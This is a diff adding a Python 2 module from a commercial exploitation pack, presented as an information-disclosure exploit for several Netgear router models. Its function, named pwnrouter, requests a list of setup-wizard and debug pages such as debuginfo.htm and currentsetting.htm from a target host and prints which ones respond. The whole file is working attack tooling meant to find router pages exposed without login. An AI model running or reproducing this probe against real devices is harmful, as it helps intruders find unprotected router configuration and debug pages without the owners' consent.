@@ -1,0 +1,92 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2015
+#
+
+###
+# STD modules
+###
+import os, sys
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_netgear_1'
+_vendor_ = 'netgear'
+_model_  = ['DGND3300v2', 'WNR2000v2', 'DGN1000', 'N300', 'WNDR3700v4']
+_vuln_   = 'Information Disclosure'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  htmls = [
+    "multi_login.html",
+    "goodbye.html",
+    "debuginfo.htm",
+    "currentsetting.htm",
+    "BRS_wanlan_conflict.html",
+    "BRS_top.html",
+    "BRS_success.html",
+    "BRS_retry.htm",
+    "BRS_plzWait.html",
+    "BRS_ping_result.html",
+    "BRS_netgear_success.html",
+    "BRS_index.htm",
+    "BRS_check_manulConfig.html",
+    "BRS_05_networkIssue.html",
+    "BRS_04_applySettings_wgetResult.html",
+    "BRS_04_applySettings_wget.html",
+    "BRS_04_applySettings_ping.html",
+    "BRS_04_applySettings.html",
+    "BRS_04_B_checkNet_ping.html",
+    "BRS_04_B_checkNet.html",
+    "BRS_03B_haveBackupFile_waitReboot.html",
+    "BRS_03B_haveBackupFile_ping.html",
+    "BRS_03B_haveBackupFile_fileRestore.html",
+    "BRS_03B_haveBackupFile_change_domain.htm",
+    "BRS_03B_haveBackupFile.html",
+    "BRS_03A_detcInetType.html",
+    "BRS_03A_F_l2tp_reenter.html",
+    "BRS_03A_F_l2tp.html",
+    "BRS_03A_E_IP_problem_staticIP_B_macClone_plzWait.html",
+    "BRS_03A_E_IP_problem_staticIP_B_macClone.html",
+    "BRS_03A_E_IP_problem_staticIP_A_inputIP.html",
+    "BRS_03A_E_IP_problem_staticIP.html",
+    "BRS_03A_E_IP_problem.html",
+    "BRS_03A_D_bigpond.html",
+    "BRS_03A_C_pptp_reenter.html",
+    "BRS_03A_C_pptp.html",
+    "BRS_03A_B_pppoe_reenter.html",
+    "BRS_03A_B_pppoe.html",
+    "BRS_03A_A_noWan_check_net.html",
+    "BRS_03A_A_noWan.html",
+    "BRS_02_genieHelp.html",
+    "BRS_01_checkNet_ping.html",
+    "BRS_01_checkNet.html",
+  ]
+  for html in htmls:
+    url = 'http://%s/%s'%(host, html)
+    try:
+      nfo = cStringIO.StringIO()
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, url)
+      c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+      c.perform()
+      status = c.getinfo(pycurl.HTTP_CODE)
+      c.close()
+    except Exception, e:
+      print '[-] error : %s' % e
+      continue
+    print '[%d] %s'%(status, url)
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
